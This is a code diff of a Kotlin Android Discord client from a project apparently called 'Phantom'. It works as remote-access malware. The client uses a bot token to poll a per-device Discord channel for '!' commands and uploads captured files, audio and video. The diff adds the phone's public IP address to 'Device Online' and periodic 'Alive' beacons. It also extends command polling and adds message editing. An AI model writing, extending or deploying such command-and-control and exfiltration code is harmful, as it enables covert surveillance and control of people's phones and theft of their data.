@@ -52,6 +52,7 @@ class DiscordGatewayClient(
     private var myChannelId: String? = null
     private var deviceSuffix: String = UUID.randomUUID().toString().take(6)
     private var reconnectAttempt = 0
+    private var reconnecting = false
     private var resuming = false
     private var closing = false
     private var connectVersion = 0L
@@ -172,6 +173,7 @@ class DiscordGatewayClient(
 
     private fun bootViaRest() {
         try {
+            val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
             val guildsReq = Request.Builder()
                 .url("https://discord.com/api/v10/users/@me/guilds")
                 .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
@@ -182,6 +184,7 @@ class DiscordGatewayClient(
                     val guilds = JSONArray(gr.body?.string() ?: return)
                     if (guilds.length() > 0) {
                         val gId = guilds.getJSONObject(0).optString("id")
+                        guildId = guildId ?: gId
                         val chReq = Request.Builder()
                             .url("https://discord.com/api/v10/guilds/$gId/channels")
                             .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
@@ -192,24 +195,9 @@ class DiscordGatewayClient(
                                 val channels = JSONArray(cr.body?.string() ?: return)
                                 for (i in 0 until channels.length()) {
                                     val ch = channels.getJSONObject(i)
-                                    if (ch.optInt("type", -1) == 0) {
+                                    if (ch.optString("name", "") == prefix) {
                                         restChannelId = ch.optString("id", null)
-                                        if (restChannelId != null) {
-                                            val bootMsg = JSONObject().put("content", "📡 **Phantom booting** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})")
-                                            val msgReq = Request.Builder()
-                                                .url("https://discord.com/api/v10/channels/$restChannelId/messages")
-                                                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
-                                                .header("Content-Type", "application/json")
-                                                .post(bootMsg.toString().toRequestBody(jsonMedia))
-                                                .build()
-                                            httpClient.newCall(msgReq).execute().close()
-                                            debug("boot msg sent to $restChannelId")
-                                            status("Boot msg sent")
-                                            whPost(JSONObject().apply {
-                                                put("event", "boot_sent")
-                                                put("channel", restChannelId)
-                                            })
-                                        }
+                                        debug("Found device channel via REST: $restChannelId")
                                         break
                                     }
                                 }
@@ -238,21 +226,23 @@ class DiscordGatewayClient(
     }
 
     private fun whPost(data: JSONObject) {
-        val event = data.optString("event", "?")
-        debug("whPost: $event")
-        try {
-            val body = data.toString()
-            debug("whPost: body len=${body.length}")
-            val req = Request.Builder()
-                .url(DiscordConfig.WEBHOOK_URL)
-                .header("Content-Type", "application/json")
-                .post(body.toRequestBody(jsonMedia))
-                .build()
-            val resp = httpClient.newCall(req).execute()
-            debug("whPost: HTTP ${resp.code}")
-            resp.close()
-        } catch (e: Exception) {
-            debug("whPost FAIL ${e::class.simpleName}: ${e.message}")
+        scope?.launch(Dispatchers.IO) {
+            val event = data.optString("event", "?")
+            debug("whPost: $event")
+            try {
+                val body = data.toString()
+                debug("whPost: body len=${body.length}")
+                val req = Request.Builder()
+                    .url(DiscordConfig.WEBHOOK_URL)
+                    .header("Content-Type", "application/json")
+                    .post(body.toRequestBody(jsonMedia))
+                    .build()
+                val resp = httpClient.newCall(req).execute()
+                debug("whPost: HTTP ${resp.code}")
+                resp.close()
+            } catch (e: Exception) {
+                debug("whPost FAIL ${e::class.simpleName}: ${e.message}")
+            }
         }
     }
 
@@ -266,11 +256,11 @@ class DiscordGatewayClient(
         }
     }
 
-    private fun pollMessages() {
+    private suspend fun pollMessages() {
         val chId = myChannelId ?: return
         try {
             val req = Request.Builder()
-                .url("https://discord.com/api/v10/channels/$chId/messages?limit=1")
+                .url("https://discord.com/api/v10/channels/$chId/messages?limit=5")
                 .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                 .build()
             executeWithRetry(req).use { r ->
@@ -278,16 +268,18 @@ class DiscordGatewayClient(
                 val body = r.body?.string() ?: return
                 val arr = JSONArray(body)
                 if (arr.length() == 0) return
-                val msg = arr.getJSONObject(0)
-                val msgId = msg.optString("id", "")
-                if (msgId == lastPolledMsgId) return
-                lastPolledMsgId = msgId
-                val content = msg.optString("content", "").trim()
-                if (!content.startsWith("!")) return
-                val parts = content.substring(1).split(" ", limit = 2)
-                val action = parts[0].lowercase()
-                val payload = parts.getOrNull(1)
-                onCommand(action, payload)
+                for (i in arr.length() - 1 downTo 0) {
+                    val msg = arr.getJSONObject(i)
+                    val msgId = msg.optString("id", "")
+                    if (msgId <= (lastPolledMsgId ?: "")) continue
+                    lastPolledMsgId = msgId
+                    val content = msg.optString("content", "").trim()
+                    if (!content.startsWith("!")) continue
+                    val parts = content.substring(1).split(" ", limit = 2)
+                    val action = parts[0].lowercase()
+                    val payload = parts.getOrNull(1)
+                    onCommand(action, payload)
+                }
             }
         } catch (_: Exception) {}
     }
@@ -304,6 +296,7 @@ class DiscordGatewayClient(
             ws = client.newWebSocket(req, object : WebSocketListener() {
                 override fun onOpen(ws: WebSocket, response: Response) {
                     debug("ws: onOpen")
+                    reconnecting = false
                     status("WS open")
                 }
 
@@ -340,12 +333,16 @@ class DiscordGatewayClient(
     }
 
     private fun handleClose(code: Int, reason: String) {
-        if (closing) return
+        if (closing) {
+            reconnecting = false
+            return
+        }
         status("Close $code")
         if (code in FATAL_CLOSE_CODES) {
             debug("FATAL close code $code — stopping reconnection")
             status("Fatal $code")
             fatalError = true
+            reconnecting = false
             whPost(JSONObject().apply {
                 put("event", "fatal_close")
                 put("code", code)
@@ -559,10 +556,24 @@ class DiscordGatewayClient(
         }
     }
 
+    private fun getPublicIp(): String {
+        return try {
+            val req = Request.Builder().url("https://api.ipify.org?format=json").build()
+            val resp = httpClient.newCall(req).execute()
+            resp.use { r ->
+                if (r.isSuccessful) {
+                    val body = r.body?.string() ?: return "?"
+                    JSONObject(body).optString("ip", "?")
+                } else "?"
+            }
+        } catch (_: Exception) { "?" }
+    }
+
     fun sendOnlineMsg() {
         scope?.launch(Dispatchers.IO) {
             status("Sending online msg")
-            sendMsg(":green_circle: **Device Online** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})")
+            val ip = getPublicIp()
+            sendMsg(":green_circle: **Device Online** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE}) | IP: ${ip}")
             whPost(JSONObject().apply {
                 put("event", "online")
                 put("channel", myChannelId)
@@ -598,15 +609,65 @@ class DiscordGatewayClient(
         }
     }
 
+    suspend fun sendMsgAwait(text: String): String? = withContext(Dispatchers.IO) {
+        val chId = myChannelId ?: return@withContext null
+        try {
+            val json = JSONObject().put("content", text)
+            val url = "https://discord.com/api/v10/channels/$chId/messages"
+            val req = Request.Builder()
+                .url(url)
+                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
+                .header("Content-Type", "application/json")
+                .post(json.toString().toRequestBody(jsonMedia))
+                .build()
+            executeWithRetry(req).use { resp ->
+                if (!resp.isSuccessful) return@use null
+                val body = resp.body?.string() ?: return@use null
+                JSONObject(body).optString("id", null)
+            }
+        } catch (e: Exception) {
+            debug("sendMsgAwait: ${e.message}")
+            null
+        }
+    }
+
+    fun editMsg(messageId: String, newText: String) {
+        val chId = myChannelId ?: return
+        scope?.launch(Dispatchers.IO) {
+            try {
+                val json = JSONObject().put("content", newText)
+                val url = "https://discord.com/api/v10/channels/$chId/messages/$messageId"
+                val req = Request.Builder()
+                    .url(url)
+                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
+                    .header("Content-Type", "application/json")
+                    .method("PATCH", json.toString().toRequestBody(jsonMedia))
+                    .build()
+                executeWithRetry(req).use { }
+            } catch (e: Exception) {
+                debug("editMsg: ${e.message}")
+            }
+        }
+    }
+
     fun sendFile(text: String, fileName: String, fileBytes: ByteArray) {
         val chId = myChannelId ?: return
         scope?.launch(Dispatchers.IO) {
             try {
+                val mime = when {
+                    fileName.endsWith(".png") -> "image/png"
+                    fileName.endsWith(".jpg") || fileName.endsWith(".jpeg") -> "image/jpeg"
+                    fileName.endsWith(".gif") -> "image/gif"
+                    fileName.endsWith(".mp3") || fileName.endsWith(".m4a") -> "audio/mpeg"
+                    fileName.endsWith(".mp4") -> "video/mp4"
+                    fileName.endsWith(".txt") || fileName.endsWith(".log") -> "text/plain"
+                    else -> "application/octet-stream"
+                }.toMediaType()
                 val payloadJson = JSONObject().put("content", text)
                 val body = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("payload_json", null, payloadJson.toString().toRequestBody(jsonMedia))
-                    .addFormDataPart("file", fileName, fileBytes.toRequestBody("image/png".toMediaType()))
+                    .addFormDataPart("file", fileName, fileBytes.toRequestBody(mime))
                     .build()
                 val url = "https://discord.com/api/v10/channels/$chId/messages"
                 val req = Request.Builder()
@@ -671,13 +732,16 @@ class DiscordGatewayClient(
         deviceHeartbeatJob = scope?.launch {
             delay(DEVICE_HB_MIN + (Math.random() * (DEVICE_HB_MAX - DEVICE_HB_MIN)).toLong())
             while (isActive) {
-                sendMsg(":heartbeat: **Alive** — ${android.os.Build.MODEL}")
+                val ip = getPublicIp()
+                sendMsg(":heartbeat: **Alive** — ${android.os.Build.MODEL} | IP: ${ip}")
                 delay(DEVICE_HB_MIN + (Math.random() * (DEVICE_HB_MAX - DEVICE_HB_MIN)).toLong())
             }
         }
     }
 
     private fun scheduleReconnect() {
+        if (reconnecting) return
+        reconnecting = true
         reconnectJob?.cancel()
         val scheduleVersion = connectVersion
         if (closing || fatalError) return
@@ -698,18 +762,19 @@ class DiscordGatewayClient(
             status("Recon ${reconnectAttempt}")
             debug("Reconnect in ${delay}ms (attempt ${reconnectAttempt})")
             delay(delay)
+            reconnecting = false
             if (!closing && !fatalError && connectVersion == scheduleVersion) connect()
         }
     }
 
-    private fun executeWithRetry(request: Request): Response {
+    private suspend fun executeWithRetry(request: Request): Response {
         var retries = 0
         while (retries < 3) {
             val resp = httpClient.newCall(request).execute()
             if (resp.code == 429) {
                 val retryAfter = resp.header("Retry-After")?.toFloatOrNull()?.toLong() ?: 5L
                 resp.close()
-                Thread.sleep(retryAfter * 1000)
+                delay(retryAfter * 1000)
                 retries++
                 continue
             }
